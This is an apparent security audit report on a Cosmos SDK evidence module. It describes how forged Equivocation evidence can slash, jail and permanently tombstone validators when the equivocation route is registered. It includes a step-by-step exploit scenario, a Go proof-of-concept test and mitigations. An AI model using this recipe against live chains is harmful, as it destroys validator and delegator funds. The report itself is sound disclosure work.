# Audit Report

## Title
Arbitrary Validator Slashing via Unauthenticated Evidence Submission

## Summary
The evidence module allows any user to submit fabricated `Equivocation` evidence through `MsgSubmitEvidence` that can slash, jail, and permanently tombstone arbitrary validators without providing cryptographic proof of misbehavior. When applications register the equivocation handler route (a pattern demonstrated in the test suite), the `HandleEquivocationEvidence` function processes user-submitted evidence without verifying its authenticity, enabling malicious actors to destroy innocent validators.

## Impact
**High** - Direct loss of funds through slashing and critical permanent freezing of validator status through tombstoning.

## Finding Description

**Location:** 
- Evidence submission: [1](#0-0) 
- Evidence handling: [2](#0-1) 
- Evidence validation: [3](#0-2) 

**Intended Logic:** 
The evidence module is designed to handle validator misbehavior evidence. Evidence from Tendermint's consensus layer (containing cryptographic proofs in `DuplicateVoteEvidence`) is converted to `Equivocation` format and processed via `BeginBlocker`. [4](#0-3) 

The `MsgSubmitEvidence` message is intended for submitting arbitrary evidence types, with each type having a registered handler. [5](#0-4) 

**Actual Logic:** 
The codebase allows the `Equivocation` type to be submitted via `MsgSubmitEvidence` when the equivocation route is registered (pattern shown in tests). [6](#0-5) 

However, `ValidateBasic()` only performs trivial checks on field values without any cryptographic validation. [7](#0-6) 

The `HandleEquivocationEvidence` function processes the evidence by validating only metadata (age, validator existence, tombstone status) but never verifies that the validator actually committed the alleged double-signing infraction. [2](#0-1) 

The `Equivocation` type contains only basic fields (height, time, power, consensus address) with no cryptographic signatures or proofs. [8](#0-7) 

**Exploit Scenario:**
1. Attacker identifies an active validator they wish to attack
2. Attacker creates a fabricated `Equivocation` object with:
   - The target validator's consensus address
   - A recent height and timestamp (to pass age validation)
   - A plausible power value
3. Attacker wraps this in a `MsgSubmitEvidence` message
4. Attacker submits the transaction to the network
5. The message handler calls `SubmitEvidence` which routes to the registered handler
6. `HandleEquivocationEvidence` validates the evidence metadata but not its authenticity
7. The innocent validator is slashed by `SlashFractionDoubleSign`, jailed until `DoubleSignJailEndTime` (permanent), and tombstoned
8. The validator loses funds and can never rejoin the validator set

**Security Failure:** 
This breaks the authorization and authentication security properties. The evidence module processes unverified, user-supplied claims as if they were cryptographically proven facts from the consensus layer, allowing arbitrary state modification (slashing, jailing, tombstoning) without proof.

## Impact Explanation

**Assets Affected:**
- Validator stake (slashed by `SlashFractionDoubleSign`, typically 5% of bonded tokens)
- Validator status (permanently tombstoned, cannot rejoin validator set)
- Delegator funds (delegations to the attacked validator are also slashed)
- Network security (if multiple validators are attacked)

**Severity:**
- **Direct Loss of Funds:** Immediate slashing of validator and delegator stakes
- **Permanent Freezing:** Tombstoning prevents the validator from ever operating again, even if the evidence was fabricated
- **Systemic Risk:** An attacker could systematically attack multiple validators, potentially compromising network liveness or security

This vulnerability enables complete destruction of validator operations and theft of funds through slashing, meeting the "Direct loss of funds" and "Critical Permanent freezing" impact criteria.

## Likelihood Explanation

**Who Can Trigger:**
Any network participant with the ability to submit transactions can exploit this vulnerability. No special privileges are required.

**Conditions Required:**
The vulnerability is exploitable when an application registers the equivocation handler route with the evidence keeper's router. While the default `simapp` configuration doesn't register this route [9](#0-8) , the test suite demonstrates this is a supported pattern that applications may use. [10](#0-9) 

**Frequency:**
Once the route is registered, the attack can be executed repeatedly against different validators with minimal cost (just transaction fees). Each successful attack permanently destroys a validator.

## Recommendation

Implement one of the following mitigations:

1. **Disable user submission of Equivocation evidence:** Remove the ability to register the equivocation route for user-submitted evidence. Only allow `Equivocation` evidence from Tendermint via `BeginBlocker`, which includes cryptographic proofs validated at the consensus layer.

2. **Add cryptographic validation:** Extend the `Equivocation` type to include cryptographic proofs (vote signatures) and validate them in `HandleEquivocationEvidence` before processing. This would require restructuring to distinguish between trusted (Tendermint) and untrusted (user-submitted) evidence sources.

3. **Restrict evidence submission:** Add access controls to `MsgSubmitEvidence` to only allow trusted entities (e.g., validators with sufficient stake) to submit evidence, with additional validation requirements.

The recommended approach is option 1, as it aligns with the separation of concerns: Tendermint handles double-sign detection and provides cryptographically-proven evidence, while the SDK processes it.

## Proof of Concept

**File:** `x/evidence/keeper/infraction_test.go` (add new test function)

**Test Function:** `TestArbitraryValidatorSlashingViaFabricatedEvidence`

**Setup:**
```go
func (suite *KeeperTestSuite) TestArbitraryValidatorSlashingViaFabricatedEvidence() {
    // 1. Set up a real validator (not using the test handler)
    ctx := suite.ctx.WithIsCheckTx(false).WithBlockHeight(1)
    suite.populateValidators(ctx)
    
    // 2. Register the REAL HandleEquivocationEvidence handler (not the test one)
    evidenceKeeper := keeper.NewKeeper(
        suite.app.AppCodec(), suite.app.GetKey(types.StoreKey), 
        &suite.app.StakingKeeper, suite.app.SlashingKeeper,
    )
    router := types.NewRouter()
    // Register the actual production handler that slashes validators
    router = router.AddRoute(types.RouteEquivocation, func(ctx sdk.Context, e exported.Evidence) error {
        eq := e.(*types.Equivocation)
        evidenceKeeper.HandleEquivocationEvidence(ctx, eq)
        return nil
    })
    evidenceKeeper.SetRouter(router)
    suite.app.EvidenceKeeper = *evidenceKeeper
    
    // 3. Initialize validator with stake
    stakingParams := suite.app.StakingKeeper.GetParams(ctx)
    stakingParams.MinCommissionRate = sdk.NewDec(0)
    suite.app.StakingKeeper.SetParams(ctx, stakingParams)
    
    operatorAddr, val := valAddresses[0], pubkeys[0]
    power := int64(100)
    
    // Create validator
    tstaking := teststaking.NewHelper(suite.T(), ctx, suite.app.StakingKeeper)
    tstaking.CreateValidatorWithValPower(operatorAddr, val, power, true)
    staking.EndBlocker(ctx, suite.app.StakingKeeper)
    
    // Initialize signing info
    req := abcitypes.RequestBeginBlock{
        LastCommitInfo: abcitypes.LastCommitInfo{
            Votes: []abcitypes.VoteInfo{{
                Validator: abcitypes.Validator{
                    Address: val.Address().Bytes(),
                    Power:   power,
                },
                SignedLastBlock: true,
            }},
        },
    }
    slashing.BeginBlocker(ctx, req, suite.app.SlashingKeeper)
    
    // Record initial state
    validatorBefore := suite.app.StakingKeeper.Validator(ctx, operatorAddr)
    tokensBefore := validatorBefore.GetTokens()
    isJailedBefore := validatorBefore.IsJailed()
    isTombstonedBefore := suite.app.SlashingKeeper.IsTombstoned(ctx, sdk.ConsAddress(val.Address()))
    
    suite.Require().False(isJailedBefore, "validator should not be jailed initially")
    suite.Require().False(isTombstonedBefore, "validator should not be tombstoned initially")
}
```

**Trigger:**
```go
    // 4. Attacker submits FABRICATED evidence (validator never actually double-signed)
    fabricatedEvidence := &types.Equivocation{
        Height:           ctx.BlockHeight() - 1, // Recent height to pass age check
        Time:             ctx.BlockTime().Add(-time.Minute), // Recent time
        Power:            power,
        ConsensusAddress: sdk.ConsAddress(val.Address()).String(),
    }
    
    // Submit the fabricated evidence via the keeper
    err := suite.app.EvidenceKeeper.SubmitEvidence(ctx, fabricatedEvidence)
    suite.Require().NoError(err, "fabricated evidence should be accepted")
```

**Observation:**
```go
    // 5. Verify the innocent validator was slashed, jailed, and tombstoned
    validatorAfter := suite.app.StakingKeeper.Validator(ctx, operatorAddr)
    tokensAfter := validatorAfter.GetTokens()
    isJailedAfter := validatorAfter.IsJailed()
    isTombstonedAfter := suite.app.SlashingKeeper.IsTombstoned(ctx, sdk.ConsAddress(val.Address()))
    
    // VULNERABILITY CONFIRMED: The validator was punished based on fabricated evidence!
    suite.Require().True(tokensAfter.LT(tokensBefore), 
        "validator tokens should be slashed (was %s, now %s)", tokensBefore, tokensAfter)
    suite.Require().True(isJailedAfter, 
        "validator should be jailed due to fabricated evidence")
    suite.Require().True(isTombstonedAfter, 
        "validator should be tombstoned due to fabricated evidence")
    
    // The validator lost funds and can never rejoin, all from fabricated evidence with no cryptographic proof
}
```

This PoC demonstrates that when the equivocation route is registered, any attacker can submit fabricated evidence causing innocent validators to be slashed, jailed, and permanently tombstoned without providing any cryptographic proof of actual misbehavior.

### Citations

**File:** x/evidence/keeper/keeper.go (L78-100)
```go
func (k Keeper) SubmitEvidence(ctx sdk.Context, evidence exported.Evidence) error {
	if _, ok := k.GetEvidence(ctx, evidence.Hash()); ok {
		return sdkerrors.Wrap(types.ErrEvidenceExists, evidence.Hash().String())
	}
	if !k.router.HasRoute(evidence.Route()) {
		return sdkerrors.Wrap(types.ErrNoEvidenceHandlerExists, evidence.Route())
	}

	handler := k.router.GetRoute(evidence.Route())
	if err := handler(ctx, evidence); err != nil {
		return sdkerrors.Wrap(types.ErrInvalidEvidence, err.Error())
	}

	ctx.EventManager().EmitEvent(
		sdk.NewEvent(
			types.EventTypeSubmitEvidence,
			sdk.NewAttribute(types.AttributeKeyEvidenceHash, evidence.Hash().String()),
		),
	)

	k.SetEvidence(ctx, evidence)
	return nil
}
```

**File:** x/evidence/keeper/infraction.go (L25-123)
```go
func (k Keeper) HandleEquivocationEvidence(ctx sdk.Context, evidence *types.Equivocation) {
	logger := k.Logger(ctx)
	consAddr := evidence.GetConsensusAddress()

	if _, err := k.slashingKeeper.GetPubkey(ctx, consAddr.Bytes()); err != nil {
		// Ignore evidence that cannot be handled.
		//
		// NOTE: We used to panic with:
		// `panic(fmt.Sprintf("Validator consensus-address %v not found", consAddr))`,
		// but this couples the expectations of the app to both Tendermint and
		// the simulator.  Both are expected to provide the full range of
		// allowable but none of the disallowed evidence types.  Instead of
		// getting this coordination right, it is easier to relax the
		// constraints and ignore evidence that cannot be handled.
		return
	}

	// calculate the age of the evidence
	infractionHeight := evidence.GetHeight()
	infractionTime := evidence.GetTime()
	ageDuration := ctx.BlockHeader().Time.Sub(infractionTime)
	ageBlocks := ctx.BlockHeader().Height - infractionHeight

	// Reject evidence if the double-sign is too old. Evidence is considered stale
	// if the difference in time and number of blocks is greater than the allowed
	// parameters defined.
	cp := ctx.ConsensusParams()
	if cp != nil && cp.Evidence != nil {
		if ageDuration > cp.Evidence.MaxAgeDuration && ageBlocks > cp.Evidence.MaxAgeNumBlocks {
			logger.Info(
				"ignored equivocation; evidence too old",
				"validator", consAddr,
				"infraction_height", infractionHeight,
				"max_age_num_blocks", cp.Evidence.MaxAgeNumBlocks,
				"infraction_time", infractionTime,
				"max_age_duration", cp.Evidence.MaxAgeDuration,
			)
			return
		}
	}

	validator := k.stakingKeeper.ValidatorByConsAddr(ctx, consAddr)
	if validator == nil || validator.IsUnbonded() {
		// Defensive: Simulation doesn't take unbonding periods into account, and
		// Tendermint might break this assumption at some point.
		return
	}

	if ok := k.slashingKeeper.HasValidatorSigningInfo(ctx, consAddr); !ok {
		panic(fmt.Sprintf("expected signing info for validator %s but not found", consAddr))
	}

	// ignore if the validator is already tombstoned
	if k.slashingKeeper.IsTombstoned(ctx, consAddr) {
		logger.Info(
			"ignored equivocation; validator already tombstoned",
			"validator", consAddr,
			"infraction_height", infractionHeight,
			"infraction_time", infractionTime,
		)
		return
	}

	logger.Info(
		"confirmed equivocation",
		"validator", consAddr,
		"infraction_height", infractionHeight,
		"infraction_time", infractionTime,
	)

	// We need to retrieve the stake distribution which signed the block, so we
	// subtract ValidatorUpdateDelay from the evidence height.
	// Note, that this *can* result in a negative "distributionHeight", up to
	// -ValidatorUpdateDelay, i.e. at the end of the
	// pre-genesis block (none) = at the beginning of the genesis block.
	// That's fine since this is just used to filter unbonding delegations & redelegations.
	distributionHeight := infractionHeight - sdk.ValidatorUpdateDelay

	// Slash validator. The `power` is the int64 power of the validator as provided
	// to/by Tendermint. This value is validator.Tokens as sent to Tendermint via
	// ABCI, and now received as evidence. The fraction is passed in to separately
	// to slash unbonding and rebonding delegations.
	k.slashingKeeper.Slash(
		ctx,
		consAddr,
		k.slashingKeeper.SlashFractionDoubleSign(ctx),
		evidence.GetValidatorPower(), distributionHeight,
	)

	// Jail the validator if not already jailed. This will begin unbonding the
	// validator if not already unbonding (tombstoned).
	if !validator.IsJailed() {
		k.slashingKeeper.Jail(ctx, consAddr)
	}

	k.slashingKeeper.JailUntil(ctx, consAddr, types.DoubleSignJailEndTime)
	k.slashingKeeper.Tombstone(ctx, consAddr)
	k.SetEvidence(ctx, evidence)
}
```

**File:** x/evidence/types/evidence.go (L45-61)
```go
// ValidateBasic performs basic stateless validation checks on an Equivocation object.
func (e *Equivocation) ValidateBasic() error {
	if e.Time.Unix() <= 0 {
		return fmt.Errorf("invalid equivocation time: %s", e.Time)
	}
	if e.Height < 1 {
		return fmt.Errorf("invalid equivocation height: %d", e.Height)
	}
	if e.Power < 1 {
		return fmt.Errorf("invalid equivocation validator power: %d", e.Power)
	}
	if e.ConsensusAddress == "" {
		return fmt.Errorf("invalid equivocation validator consensus address: %s", e.ConsensusAddress)
	}

	return nil
}
```

**File:** x/evidence/abci.go (L14-31)
```go
// BeginBlocker iterates through and handles any newly discovered evidence of
// misbehavior submitted by Tendermint. Currently, only equivocation is handled.
func BeginBlocker(ctx sdk.Context, req abci.RequestBeginBlock, k keeper.Keeper) {
	defer telemetry.ModuleMeasureSince(types.ModuleName, time.Now(), telemetry.MetricKeyBeginBlocker)

	for _, tmEvidence := range req.ByzantineValidators {
		switch tmEvidence.Type {
		// It's still ongoing discussion how should we treat and slash attacks with
		// premeditation. So for now we agree to treat them in the same way.
		case abci.MisbehaviorType_DUPLICATE_VOTE, abci.MisbehaviorType_LIGHT_CLIENT_ATTACK:
			evidence := types.FromABCIEvidence(tmEvidence)
			k.HandleEquivocationEvidence(ctx, evidence.(*types.Equivocation))

		default:
			k.Logger(ctx).Error(fmt.Sprintf("ignored unknown evidence type: %s", tmEvidence.Type))
		}
	}
}
```

**File:** x/evidence/spec/03_messages.md (L9-22)
```markdown
Evidence is submitted through a `MsgSubmitEvidence` message:

```protobuf
// MsgSubmitEvidence represents a message that supports submitting arbitrary
// Evidence of misbehavior such as equivocation or counterfactual signing.
message MsgSubmitEvidence {
  string              submitter = 1;
  google.protobuf.Any evidence  = 2;
}
```

Note, the `Evidence` of a `MsgSubmitEvidence` message must have a corresponding
`Handler` registered with the `x/evidence` module's `Router` in order to be processed
and routed correctly.
```

**File:** x/evidence/handler_test.go (L60-62)
```go
	router := types.NewRouter()
	router = router.AddRoute(types.RouteEquivocation, testEquivocationHandler(*evidenceKeeper))
	evidenceKeeper.SetRouter(router)
```

**File:** proto/cosmos/evidence/v1beta1/evidence.proto (L10-21)
```text
// Equivocation implements the Evidence interface and defines evidence of double
// signing misbehavior.
message Equivocation {
  option (gogoproto.goproto_stringer) = false;
  option (gogoproto.goproto_getters)  = false;
  option (gogoproto.equal)            = false;

  int64                     height            = 1;
  google.protobuf.Timestamp time              = 2 [(gogoproto.nullable) = false, (gogoproto.stdtime) = true];
  int64                     power             = 3;
  string                    consensus_address = 4 [(gogoproto.moretags) = "yaml:\"consensus_address\""];
}
```

**File:** simapp/app.go (L322-327)
```go
	// create evidence keeper with router
	evidenceKeeper := evidencekeeper.NewKeeper(
		appCodec, keys[evidencetypes.StoreKey], &app.StakingKeeper, app.SlashingKeeper,
	)
	// If evidence needs to be handled for the app, set routes in router here and seal
	app.EvidenceKeeper = *evidenceKeeper
```

**File:** x/evidence/keeper/keeper_test.go (L88-93)
```go
	evidenceKeeper := keeper.NewKeeper(
		app.AppCodec(), app.GetKey(types.StoreKey), app.StakingKeeper, app.SlashingKeeper,
	)
	router := types.NewRouter()
	router = router.AddRoute(types.RouteEquivocation, testEquivocationHandler(*evidenceKeeper))
	evidenceKeeper.SetRouter(router)
```
